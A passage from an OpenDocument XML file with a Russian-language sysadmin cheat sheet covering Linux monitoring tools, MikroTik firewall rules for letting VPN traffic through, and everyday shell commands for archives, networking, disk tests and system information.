      <text:p text:style-name="P2"><text:span text:style-name="T3">* slabtop - информация о заполнении SLAB-кэша</text:span></text:p>
      <text:p text:style-name="P1">Процессор:</text:p>
      <text:p text:style-name="P1">* mpstat (sysstat) - общая информация об использовании процессора (одного или всех процессоров)</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>* turbostat (kernel-tools) - информация о топологии процессора, частоте, питании, температуре</text:p>
      <text:p text:style-name="P1">* rdmsr - (Read from Model Specific Register) чтение из моделезависимых регистров (позволяет оценить использование LLC-кэша и прочее)</text:p>
      <text:p text:style-name="P1">Универсальные:</text:p>
      <text:p text:style-name="P1">* sar - (system activity report) информация о системной активности в реальном времени (диск, память, процессор и так далее)</text:p>
      <text:p text:style-name="P1">* dstat - универсальный инструмент для сбора информации о системе (vmstat, iostat, netstat, ifstat и ещё много других в одном флаконе)</text:p>
      <text:p text:style-name="P1">* dmesg - журнал сообщений ядра с момента загрузки системы</text:p>
      <text:p text:style-name="P1">* /proc - псевдофайловая система, предоставляющая доступ к внутренним данным/счётчикам ядра</text:p>
      <text:p text:style-name="P7">* sysdig - универсальный инструмент для сбора и анализа данных о системе (сотни различных источников скомбинированные вместе)</text:p>
      <text:p text:style-name="P1">Шпаргалка по фаерволу Mikrotik, пропускаем VPN соединения</text:p>
      <text:p text:style-name="P1">1. Разрешить весь VPN-трафик через VPN-соединения:</text:p>
      <text:p text:style-name="P1">Надо учитывать, что некоторые виды подключения, например GRE не являются PPP.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">/ip firewall filter</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add chain=forward comment="Permit all PPP" in-interface=all-ppp</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">2. </text:span><text:span text:style-name="T3">Разрешить</text:span><text:span text:style-name="T2"> PPTP-</text:span><text:span text:style-name="T3">подключение</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">/ip firewall filter</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add chain=input dst-port=1723 protocol=tcp comment="Permit PPTP"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add action=accept chain=input protocol=gre comment="Permit GRE"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">3. </text:span><text:span text:style-name="T3">Разрешить</text:span><text:span text:style-name="T2"> L2TP-</text:span><text:span text:style-name="T3">подключение</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">/ip firewall filter</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add chain=input dst-port=1701 protocol=udp comment="Permit L2TP"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">4. </text:span><text:span text:style-name="T3">Разрешить</text:span><text:span text:style-name="T2"> IPSec-</text:span><text:span text:style-name="T3">подключение</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">/ip firewall filter</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add chain=input port=500,4500 protocol=udp comment="Permit IPSec ports 500 and 4500"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add chain=input protocol=ipsec-esp comment="Permit IPSec protocol ipsec-esp"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">5. </text:span><text:span text:style-name="T3">Разрешить</text:span><text:span text:style-name="T2"> OpenVPN-</text:span><text:span text:style-name="T3">подключение</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">/ip firewall filter</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add action=accept chain=input dst-port=1194 protocol=tcp comment="Permit OpenVPN"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">6. </text:span><text:span text:style-name="T3">Разрешить</text:span><text:span text:style-name="T2"> SSTP-</text:span><text:span text:style-name="T3">подключение</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">/ip firewall filter</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add action=accept chain=input dst-port=443 protocol=tcp comment="Permit SSTP"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">7. </text:span><text:span text:style-name="T3">Разрешить</text:span><text:span text:style-name="T2"> GRE-</text:span><text:span text:style-name="T3">подключение</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">/ip firewall filter</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add action=accept chain=input protocol=gre comment="Permit GRE"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">8. </text:span><text:span text:style-name="T3">Разрешить</text:span><text:span text:style-name="T2"> IPIP-</text:span><text:span text:style-name="T3">подключение</text:span><text:span text:style-name="T2">: /ip firewall filter</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add action=accept chain=input protocol=ipip comment="Permit IPIP"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">9. Прохождение IPSec при использовании Fast Track . Fast Track это опция представленная в RouterOS 6.29. С помощью этой опции можно передавать пакеты в обход ядра Linux. За счет этого существенно повышается производительность маршрутизатора.</text:p>
      <text:p text:style-name="P1">Включить Fast Track можно следующим образом:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">/ip firewall filter add chain=forward action=fasttrack-connection connection-state=established,related</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Это позволит пакетам, у которых состояние «Established» или «Related» обходить ядро Linux и быть сразу перенаправленным к цели. Такие пакеты не будут проходить ни через одно правило файервола или другое правило обработки пакетов. Конечно, соединение получает состояние «установлено» или «связано» после того, как оно прошло через брандмауэр, поэтому оно по-прежнему будет безопасным.</text:p>
      <text:p text:style-name="P1">Как результат появляется недостаток: соединения IPsec так же не будут обработаны. Решить эту проблему можно следующим образом.</text:p>
      <text:p text:style-name="P1">Вначале надо пометить соединения IPsec:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">/ip firewall mangle</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add action=mark-connection chain=forward comment="Mark IPsec" ipsec-policy=out,ipsec new-connection-mark=ipsec</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add action=mark-connection chain=forward comment="Mark IPsec" ipsec-policy=in,ipsec new-connection-mark=ipsec</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Далее изменить стандартное правило Fast Track так, что бы оно не обрабатывало пакеты IPsec. Изменения внесенные в стандартное правило выделены красным.</text:p>
      <text:p text:style-name="P1">/ip firewall filter add action=fasttrack-connection chain=forward comment=FastTrack</text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">connection-mark=!ipsec connection-state=established,related</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Топ полезных команд</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Отправить тестовое письмо: </text:span><text:span text:style-name="T2">echo</text:span><text:span text:style-name="T3"> "</text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">" | </text:span><text:span text:style-name="T2">mail</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> "</text:span><text:span text:style-name="T2">Test</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Subject</text:span><text:span text:style-name="T3">" </text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3">@</text:span><text:span text:style-name="T2">gmail</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Выполнить </text:span><text:span text:style-name="T2">PHP</text:span><text:span text:style-name="T3"> функцию в консоли: </text:span><text:span text:style-name="T2">php</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> "</text:span><text:span text:style-name="T2">echo</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">phpinfo</text:span><text:span text:style-name="T3">();" | </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">date</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">timezone</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Отключить спящий режим на </text:span><text:span text:style-name="T2">ubuntu</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">server</text:span><text:span text:style-name="T3">: </text:span><text:span text:style-name="T2">sudo</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">systemctl</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">mask</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">sleep</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">target</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">suspend</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">target</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">hibernate</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">target</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">hybrid</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">sleep</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">target</text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T3">Для проверки набора переменных </text:span><text:span text:style-name="T2">BASH</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">ENV</text:span><text:span text:style-name="T3">: $ </text:span><text:span text:style-name="T2">env</text:span><text:span text:style-name="T3"> | </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">BASH</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">ENV</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Замер скорости диска:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dd if=/dev/zero of=testfile bs=4k count=1310720</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dd if=testfile of=/dev/null bs=4k count=1310720</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Обновить locate: /usr/libexec/locate.updatedb</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Конвертировать HEIC в JPG: ls *.HEIC -1 | sed -e 's/\.HEIC$//' | xargs -I {} convert {}.HEIC {}.JPG</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Изменить текстовый редактор для конкретного случая: </text:span><text:span text:style-name="T2">export</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">EDITOR</text:span><text:span text:style-name="T3">=</text:span><text:span text:style-name="T2">ee</text:span><text:span text:style-name="T3">; </text:span><text:span text:style-name="T2">crontab</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">e</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Удалить snapd в Ubuntu Server:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ sudo apt purge snapd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ sudo apt-mark hold snapd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">snapd помечен как зафиксированный.</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Удалить старые данные </text:span><text:span text:style-name="T2">telegraf</text:span><text:span text:style-name="T3"> в </text:span><text:span text:style-name="T2">Influxdb</text:span><text:span text:style-name="T3"> 1.8:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ docker exec -ti influxdb influx </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Connected to http://localhost:8086 version 1.8.10</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">InfluxDB shell version: 1.8.10</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">&gt; use telegraf;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Using database telegraf</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">&gt; DELETE WHERE time &lt; '2022-06-01'</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">будут удалены все записи до 2022-06-01</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Работа с сетью. Изменением маршрута: </text:span><text:span text:style-name="T2">route</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">change</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">default</text:span><text:span text:style-name="T3"> 192.168.1.1</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Выключаем </text:span><text:span text:style-name="T2">IPv</text:span><text:span text:style-name="T3">6: </text:span><text:span text:style-name="T2">sudo</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">nano</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sysctl</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">conf</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">net.ipv6.conf.all.disable_ipv6 = 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">net.ipv6.conf.default.disable_ipv6 = 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">net.ipv6.conf.lo.disable_ipv6 = 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Информация о пользователях и системе в </text:span><text:span text:style-name="T2">Linux</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">whoami</text:span><text:span text:style-name="T3"> или </text:span><text:span text:style-name="T2">echo</text:span><text:span text:style-name="T3"> $</text:span><text:span text:style-name="T2">USER</text:span><text:span text:style-name="T3">- выведем имя юзера</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">groups</text:span><text:span text:style-name="T3"> - выведет группы пользователя</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">id</text:span><text:span text:style-name="T3"> - выведет </text:span><text:span text:style-name="T2">User</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">IDentifier</text:span><text:span text:style-name="T3">, его имя, </text:span><text:span text:style-name="T2">Group</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">IDentifier</text:span><text:span text:style-name="T3"> и группы данного юзера с их </text:span><text:span text:style-name="T2">GID</text:span></text:p>
      <text:p text:style-name="P1">(Обычно первая сотка/тысяча юзеров зарезервирована для системных)</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">В /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">passwd</text:span><text:span text:style-name="T3"> записываются </text:span><text:span text:style-name="T2">UIDs</text:span><text:span text:style-name="T3"> пользователей</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">В /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">groups</text:span><text:span text:style-name="T3"> записываются </text:span><text:span text:style-name="T2">GIDs</text:span><text:span text:style-name="T3"> пользователей</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> - список последних логинов в систему</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">reboot</text:span><text:span text:style-name="T3"> - список перезагрузок хоста по времени</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3">1 - отобразить историю регистрации пользователя в системе и время его нахождения в ней</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">w</text:span><text:span text:style-name="T3"> - показывает активные сессии (дата, время, </text:span><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3">, простой, сколько было потреблено процессорного времени и что выполняет)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo</text:span><text:span text:style-name="T3"> $</text:span><text:span text:style-name="T2">XDG</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">CURRENT</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">DESKTOP</text:span><text:span text:style-name="T3"> - узнать какая графическая оболочка</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">hostname</text:span><text:span text:style-name="T3"> - выведет имя хоста, </text:span><text:span text:style-name="T2">hostname</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">i</text:span><text:span text:style-name="T3"> - </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3"> адреса</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">uname</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> - выводит ОС, версию ядра, архитектуру и дату сборки, процессор, лицензию и так далее, т.е. вся информация о системе, сборке или </text:span><text:soft-page-break/><text:span text:style-name="T2">lsb</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">release</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> или пакет </text:span><text:span text:style-name="T2">neofetch</text:span><text:span text:style-name="T3"> с полной информацией о системе или </text:span><text:span text:style-name="T2">cat</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">os</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">release</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">dmidecode</text:span><text:span text:style-name="T3"> - информация о железе</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">free</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">w</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3"> --</text:span><text:span text:style-name="T2">mega</text:span><text:span text:style-name="T3"> - выводит данные об использовании ОЗУ и </text:span><text:span text:style-name="T2">swap</text:span><text:span text:style-name="T3"> в мегабайтах (поле </text:span><text:span text:style-name="T2">shared</text:span><text:span text:style-name="T3"> значит разделенная между процессами память, кэш это то, что часто используется и хранится, буфер это то, что приготовлено для записи, кэш и буфера это условно свободная память)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">date</text:span><text:span text:style-name="T3"> - полная дата с часовым поясом</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ifconfig</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> - Настройки всех сетевых адаптеров</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">addr</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">show</text:span><text:span text:style-name="T3"> - Список всех сетевых интерфейсов и связанных </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">-адресов</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">wget</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">qO</text:span><text:span text:style-name="T3">- </text:span><text:span text:style-name="T2">eth</text:span><text:span text:style-name="T3">0.</text:span><text:span text:style-name="T2">me</text:span><text:span text:style-name="T3"> - Узнать внешний </text:span><text:span text:style-name="T2">IP</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">uptime</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">man</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> - документация/инструкция по указанному пакету</text:span></text:p>
      <text:p text:style-name="P1">Работа с архивами:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Создать .</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gz</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">czvf</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gz</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">full</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">path</text:span><text:span text:style-name="T3"> - создать .</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gz</text:span><text:span text:style-name="T3"> (архив)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">cjvf</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">bz</text:span><text:span text:style-name="T3">2 /</text:span><text:span text:style-name="T2">full</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">path</text:span><text:span text:style-name="T3"> - создать .</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">bz</text:span><text:span text:style-name="T3">2 (архив)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Распаковать .</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">: </text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">xvf</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gz</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Распаковать </text:span><text:span text:style-name="T2">gz</text:span><text:span text:style-name="T3">: </text:span><text:span text:style-name="T2">gunzip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">yourfile</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gz</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Распаковать многотомный архив: 7</text:span><text:span text:style-name="T2">za</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">x</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">arch</text:span><text:span text:style-name="T3">.7</text:span><text:span text:style-name="T2">z</text:span><text:span text:style-name="T3">.001</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Получить листинг файлов в архиве: </text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">tf</text:span><text:span text:style-name="T3"> &lt;</text:span><text:span text:style-name="T2">path</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">to</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">tarfile</text:span><text:span text:style-name="T3">&gt;</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Извлечь конкретный файл из архива: tar -xf &lt;path_to_tarfile&gt; [&lt;file_1_in_archive&gt; &lt;file_2_in_archive&gt; ..]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Скопировать файл на сервер: </text:span><text:span text:style-name="T2">scp</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">P</text:span><text:span text:style-name="T3"> 12322 </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">login</text:span><text:span text:style-name="T3">@111.111.111.111:/</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">user</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Быстрый совет дня для </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">: Удалите пустые строки при отображении содержимого файла с помощью </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3">, например: $ </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> . </text:span><text:span text:style-name="T2">filename</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Утилиты </text:span><text:span text:style-name="T2">linux</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">rsync</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">v</text:span><text:span text:style-name="T3"> - выводит подробную информацию о процессе копирования;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">[-</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3">] - сохраняет все атрибуты оригинальных файлов;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">u</text:span><text:span text:style-name="T3"> - не перезаписывать более новые файлы;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> - копирует символьные ссылки;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">L</text:span><text:span text:style-name="T3"> - копирует содержимое ссылок;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">p</text:span><text:span text:style-name="T3"> - сохраняет права для файлов;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3"> - сохраняет время модификации;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">e</text:span><text:span text:style-name="T3"> - использовать другой транспорт, например, </text:span><text:span text:style-name="T2">ssh</text:span><text:span text:style-name="T3">;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">[-</text:span><text:span text:style-name="T2">z</text:span><text:span text:style-name="T3">] - </text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3">жимает файлы перед передачей;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s/>- </text:span><text:span text:style-name="T2">recursive</text:span><text:span text:style-name="T3"> - перебирать директории рекурсивно;</text:span></text:p>
